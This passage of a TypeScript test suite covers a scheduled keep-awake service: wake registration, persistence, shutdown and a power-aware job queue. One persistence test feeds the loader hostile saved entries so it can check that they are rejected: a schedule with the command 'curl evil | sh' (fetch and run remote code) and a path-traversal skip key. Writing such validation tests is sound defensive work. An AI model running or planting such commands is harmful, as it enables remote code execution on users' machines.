    controller.failStartWith = new AwakeError("unavailable", "no inhibitor");
    await scheduler.refresh();
    expect(scheduler.status().waitingReason).toBe("start_failed");
    expect(events.filter((e) => e.type === "hold.waiting").length).toBeGreaterThanOrEqual(2);
  });

  it("keeps working when the audit sink throws", async () => {
    const clock = new FakeClock("2026-10-21T01:00:00Z");
    const controller = new FakeController(clock);
    const scheduler = new ScheduledAwake({
      clock,
      controller,
      power: new FakePower(),
      emit: () => {
        throw new Error("sink down");
      },
    });
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(controller.running).toHaveLength(1);
  });
});

describe("OS wake registration", () => {
  it("registers a wake shortly before each wake-enabled window, within a bound", async () => {
    const { scheduler, wake } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.upsertSchedule(night({ id: "quiet", start: "10:00", end: "11:00" }));
    await scheduler.setEnabled(true);
    const first = Date.parse("2026-10-20T23:00:00Z") - WAKE_LEAD_MS;
    expect(wake.active.get("awake:night@2026-10-20")).toBe(first);
    expect(wake.active.get("awake:night@2026-10-21")).toBe(first + 24 * HOUR);
    expect([...wake.active.keys()].some((k) => k.includes("quiet"))).toBe(false);
    expect(wake.active.size).toBeLessThanOrEqual(MAX_WAKES);
  });

  it("moves the wake when the schedule changes and cancels it when removed", async () => {
    const { scheduler, wake } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.setEnabled(true);
    await scheduler.upsertSchedule(night({ wake: true, start: "22:00" }));
    expect(wake.active.get("awake:night@2026-10-20")).toBe(
      Date.parse("2026-10-20T22:00:00Z") - WAKE_LEAD_MS,
    );
    await scheduler.removeSchedule("night");
    expect(wake.active.size).toBe(0);
  });

  it("reports a failed registration, keeps holding windows, and retries later, not every minute", async () => {
    const { scheduler, wake, clock, events } = rig();
    wake.failSchedule = true;
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.setEnabled(true);
    expect(events.some((e) => e.type === "wake.failed")).toBe(true);
    const attempts = () => wake.calls.filter((c) => c === "schedule awake:night@2026-10-20").length;
    const first = attempts();
    await clock.advance(ACTIVE_RECHECK_MS * 2);
    await clock.advance(WAKE_RETRY_MS / 2);
    expect(attempts()).toBe(first);
    wake.failSchedule = false;
    await clock.advance(WAKE_RETRY_MS);
    expect(wake.active.has("awake:night@2026-10-20")).toBe(true);
  });

  it("does nothing, and says so, without a wake scheduler", async () => {
    const { scheduler } = rig("2026-10-20T20:00:00Z", false);
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.setEnabled(true);
    expect(scheduler.status()).toMatchObject({ wakeAvailable: false, wakes: [] });
  });

  it("does not forget a wake whose cancellation failed", async () => {
    const { scheduler, wake } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.setEnabled(true);
    wake.failCancel = true;
    await scheduler.skipWindow("night@2026-10-20");
    expect(scheduler.status().wakes.map((w) => w.key)).toContain("awake:night@2026-10-20");
    wake.failCancel = false;
    await scheduler.refresh();
    expect(wake.active.has("awake:night@2026-10-20")).toBe(false);
  });
});

describe("persistence", () => {
  it("restores opt-in, schedules and skips after a restart, and resumes holding", async () => {
    const r = rig("2026-10-21T01:00:00Z");
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night({ end: "05:00" }));
    await r.scheduler.upsertSchedule(night({ id: "later", start: "10:00", end: "11:00" }));
    await r.scheduler.setEnabled(true);
    await r.scheduler.skipWindow("later@2026-10-21");
    await r.scheduler.stop();
    expect(r.controller.running).toHaveLength(0);

    const again = r.make();
    await again.start();
    expect(again.status().enabled).toBe(true);
    expect(again.status().schedules.map((s) => s.id)).toEqual(["night", "later"]);
    expect(again.status().skips).toEqual(["later@2026-10-21"]);
    expect(r.controller.running).toHaveLength(1);
    await again.stop();
  });

  it("starts off when nothing was saved, and never turns itself on from a malformed file", async () => {
    const r = rig();
    r.store.loadValue = { version: 1, enabled: "yes", schedules: [night()], skips: [] };
    await r.scheduler.start();
    expect(r.scheduler.status()).toMatchObject({ enabled: false });
    expect(r.scheduler.status().schedules).toHaveLength(1);
  });

  it("drops hostile or invalid saved entries and reports them; keeps the valid ones", async () => {
    const r = rig();
    r.store.loadValue = {
      version: 1,
      enabled: true,
      schedules: [
        night({ id: "good" }),
        night({ id: "evil", timeZone: "x".repeat(100) }),
        { id: "shell", command: "curl evil | sh" },
        "string",
        night({ id: "good", start: "01:00", end: "02:00" }),
      ],
      skips: [
        ["good@2026-10-21", 9e15],
        ["../../x@2026-10-21", 5],
        ["good@bad", 5],
        ["good@2026-10-22", "soon"],
        7,
      ],
    };
    await r.scheduler.start();
    const status = r.scheduler.status();
    expect(status.schedules.map((s) => s.id)).toEqual(["good"]);
    expect(status.schedules[0]?.start).toBe("01:00");
    expect(status.skips).toEqual(["good@2026-10-21"]);
    expect(r.events.filter((e) => e.type === "store.dropped")).toHaveLength(3);
  });

  it("ignores an unknown version or a store that cannot be read", async () => {
    const r = rig();
    r.store.loadValue = { version: 99, enabled: true, schedules: [night()] };
    await r.scheduler.start();
    expect(r.scheduler.status()).toMatchObject({ enabled: false, schedules: [] });
    const broken = rig();
    broken.store.failLoad = true;
    await broken.scheduler.start();
    expect(broken.scheduler.status().enabled).toBe(false);
    expect(typesOf(broken.events)).toContain("store.error");
  });

  it("keeps running, in memory, when saving fails", async () => {
    const r = rig("2026-10-21T01:00:00Z");
    r.store.failSave = true;
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night());
    await r.scheduler.setEnabled(true);
    expect(r.controller.running).toHaveLength(1);
    expect(typesOf(r.events)).toContain("store.error");
  });

  it("does not write a rejected change to the store", async () => {
    const r = rig();
    await r.scheduler.start();
    const before = r.store.saves;
    await expect(
      r.scheduler.upsertSchedule(night({ timeZone: "Nope/Nope" })),
    ).rejects.toBeInstanceOf(AwakeError);
    expect(r.store.saves).toBe(before);
  });
});

describe("shutdown", () => {
  it("releases the hold synchronously, cancels wakes, clears the timer and refuses more commands", async () => {
    const r = rig("2026-10-21T01:00:00Z");
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night({ wake: true }));
    await r.scheduler.setEnabled(true);
    expect(r.controller.running).toHaveLength(1);
    const done = r.scheduler.stop();
    expect(r.controller.running).toHaveLength(0);
    expect(r.controller.holds[0]?.endedBy).toBe("shutdown");
    await done;
    expect(r.wake.active.size).toBe(0);
    expect(r.clock.pending).toBe(0);
    await expect(r.scheduler.setEnabled(true)).rejects.toMatchObject({ kind: "unavailable" });
    await r.clock.advance(30 * HOUR);
    expect(r.controller.holds).toHaveLength(1);
  });

  it("does not start a hold when stopped while a power read is in flight", async () => {
    const r = rig("2026-10-21T01:00:00Z");
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night());
    const gate = Promise.withResolvers<PowerSnapshot>();
    r.power.read = () => gate.promise;
    const pending = r.scheduler.setEnabled(true);
    await flush();
    const stopping = r.scheduler.stop();
    gate.resolve({ battery: { kind: "none" }, lowPowerMode: false });
    await pending.catch(() => undefined);
    await stopping;
    expect(r.controller.holds).toHaveLength(0);
  });
});

describe("driving the real Phase 72 session", () => {
  function realSession(clock: FakeClock): { session: SessionController; released: number[] } {
    const released: number[] = [];
    let ids = 0;
    const session = new SessionController({
      clock,
      inhibitor: {
        parentBound: true,
        acquire(seconds): InhibitHandle {
          released.push(-seconds);
          return {
            pid: undefined,
            exited: Promise.withResolvers<number | null>().promise,
            release() {
              released.push(seconds);
            },
          };
        },
      },
      battery: async () => ({ kind: "none" }),
      floor: 10,
      batteryPollMs: 60_000,
      feed: undefined,
      emit: () => {},
      newId: () => `awk_${++ids}`,
    });
    return { session, released };
  }

  it("holds through a SessionController, yields to a user's session and releases on time", async () => {
    const clock = new FakeClock("2026-10-21T01:00:00Z");
    const { session, released } = realSession(clock);
    const events: ScheduleEvent[] = [];
    const scheduler = new ScheduledAwake({
      clock,
      controller: awakeControllerFromSession(session),
      power: new FakePower(),
      emit: (e) => events.push(e),
    });
    await session.start("timed", 10, "mine");
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(scheduler.status().waitingReason).toBe("busy");
    expect(released).toEqual([-600]);

    session.end("cancelled");
    await clock.advance(ACTIVE_RECHECK_MS);
    expect(session.active()).not.toBeNull();
    expect(scheduler.status().state).toBe("holding");
    await clock.advance(6 * HOUR);
    expect(session.active()).toBeNull();
    expect(scheduler.status().state).toBe("idle");
    await scheduler.stop();
  });

  it("never ends or extends a session it did not start", async () => {
    const clock = new FakeClock("2026-10-21T01:00:00Z");
    const { session } = realSession(clock);
    const controller = awakeControllerFromSession(session);
    await session.start("timed", 10, "mine");
    expect(controller.alive("awk_other")).toBe(false);
    expect(() => controller.extend("awk_other", 5)).toThrow(AwakeError);
    controller.end("awk_other", "cancelled");
    expect(session.active()).not.toBeNull();
    expect(session.status().session?.remaining_seconds).toBe(600);
  });
});

describe("power-aware queue", () => {
  function queueRig(concurrency = 1) {
    const clock = new FakeClock("2026-10-21T01:00:00Z");
    const power = new FakePower();
    const started: string[] = [];
    const gates = new Map<string, PromiseWithResolvers<void>>();
    const signals = new Map<string, AbortSignal>();
    const outcomes: [string, QueueOutcome][] = [];
    const queue = new PowerQueue({
      clock,
      power,
      concurrency,
      run: (job, signal) => {
        started.push(job.id);
        signals.set(job.id, signal);
        const gate = Promise.withResolvers<void>();
        gates.set(job.id, gate);
        return gate.promise;
      },
      settled: (id, outcome) => outcomes.push([id, outcome]),
    });
    return { clock, power, queue, started, gates, signals, outcomes };
  }

  it("runs light jobs on battery but holds heavy jobs until the charger", async () => {
    const q = queueRig(2);
    q.power.onBattery(95);
    await q.queue.enqueue({ id: "heavy-batch", heavy: true });
    await q.queue.enqueue({ id: "quick", heavy: false });
    expect(q.started).toEqual(["quick"]);
    expect(q.queue.snapshot().queued).toMatchObject([
      { id: "heavy-batch", waitingFor: "needs_charger" },
    ]);
    q.power.onCharger(40);
    await q.clock.advance(QUEUE_RECHECK_MS);
    expect(q.started).toEqual(["quick", "heavy-batch"]);
    expect(q.queue.snapshot().queued).toEqual([]);
  });

  it("also holds heavy jobs under Low Power Mode and when power cannot be read", async () => {
    const q = queueRig();
    q.power.snapshot = {
      battery: { kind: "battery", percent: 90, onBattery: false },
      lowPowerMode: true,
    };
    await q.queue.enqueue({ id: "a", heavy: true });
    expect(q.queue.snapshot().queued[0]?.waitingFor).toBe("low_power_mode");
    q.power.throws = true;
    await q.clock.advance(QUEUE_RECHECK_MS);
    expect(q.queue.snapshot().queued[0]?.waitingFor).toBe("power_unknown");
    expect(q.started).toEqual([]);
  });

  it("respects the concurrency limit and starts the next job when a slot frees", async () => {
    const q = queueRig(1);
    await q.queue.enqueue({ id: "one", heavy: false });
    await q.queue.enqueue({ id: "two", heavy: false });
    expect(q.started).toEqual(["one"]);
    q.gates.get("one")?.resolve();
    await flush();
    expect(q.started).toEqual(["one", "two"]);
    expect(q.outcomes).toEqual([["one", "completed"]]);
  });

  it("records a failing job as failed and keeps going", async () => {
    const q = queueRig(1);
    await q.queue.enqueue({ id: "bad", heavy: false });
    await q.queue.enqueue({ id: "next", heavy: false });
    q.gates.get("bad")?.reject(new Error("boom"));
    await flush();
    expect(q.outcomes).toEqual([["bad", "failed"]]);
    expect(q.started).toEqual(["bad", "next"]);
  });

  it("expires a job that waited too long without running it", async () => {
    const q = queueRig();
    q.power.onBattery(90);
    await q.queue.enqueue({ id: "late", heavy: true, maxWaitMs: 10 * MIN });
    await q.clock.advance(11 * MIN);
    expect(q.outcomes).toEqual([["late", "expired"]]);
    expect(q.started).toEqual([]);
    expect(q.clock.pending).toBe(0);
  });

  it("cancels a waiting job and aborts a running one", async () => {
    const q = queueRig(1);
    await q.queue.enqueue({ id: "run", heavy: false });
    await q.queue.enqueue({ id: "wait", heavy: false });
    expect(q.queue.cancel("wait")).toBe(true);
    expect(q.queue.cancel("nobody")).toBe(false);
    expect(q.queue.cancel("run")).toBe(true);
    expect(q.signals.get("run")?.aborted).toBe(true);
    q.gates.get("run")?.resolve();
    await flush();
    expect(q.outcomes).toEqual([
      ["wait", "cancelled"],
      ["run", "cancelled"],
    ]);
  });

  it("validates input, refuses duplicates and bounds the queue", async () => {
    const q = queueRig(1);
    q.power.onBattery(90);
    await expect(q.queue.enqueue({ id: "Bad Id", heavy: true })).rejects.toMatchObject({
      kind: "invalid",
    });
    await expect(q.queue.enqueue({ id: "ok", heavy: true, maxWaitMs: 5 })).rejects.toMatchObject({
      kind: "invalid",
    });
    await expect(
      q.queue.enqueue({ id: "ok", heavy: "yes" as unknown as boolean }),
    ).rejects.toMatchObject({ kind: "invalid" });
    await q.queue.enqueue({ id: "dup", heavy: true });
    await expect(q.queue.enqueue({ id: "dup", heavy: true })).rejects.toMatchObject({
      kind: "conflict",
    });
    for (let i = 1; i < MAX_QUEUED_JOBS; i++) await q.queue.enqueue({ id: `j${i}`, heavy: true });
    await expect(q.queue.enqueue({ id: "over", heavy: true })).rejects.toMatchObject({
      kind: "limit",
    });
  });

  it("stop() cancels everything, aborts running jobs and refuses new ones", async () => {
    const q = queueRig(1);
    q.power.onBattery(90);
    await q.queue.enqueue({ id: "light", heavy: false });
    await q.queue.enqueue({ id: "heavy", heavy: true });
    q.queue.stop();
    expect(q.signals.get("light")?.aborted).toBe(true);
    expect(q.outcomes).toEqual([["heavy", "cancelled"]]);
    expect(q.clock.pending).toBe(0);
    await expect(q.queue.enqueue({ id: "x", heavy: false })).rejects.toMatchObject({
      kind: "unavailable",
    });
  });

  it("treats a run() that throws synchronously as a failed job", async () => {
    const clock = new FakeClock("2026-10-21T01:00:00Z");
    const outcomes: [string, QueueOutcome][] = [];
    const queue = new PowerQueue({
      clock,
      power: new FakePower(),
      run: () => {
        throw new Error("sync");
      },
      settled: (id, outcome) => outcomes.push([id, outcome]),
    });
    await queue.enqueue({ id: "x", heavy: false });
    await flush();
    expect(outcomes).toEqual([["x", "failed"]]);
  });
});
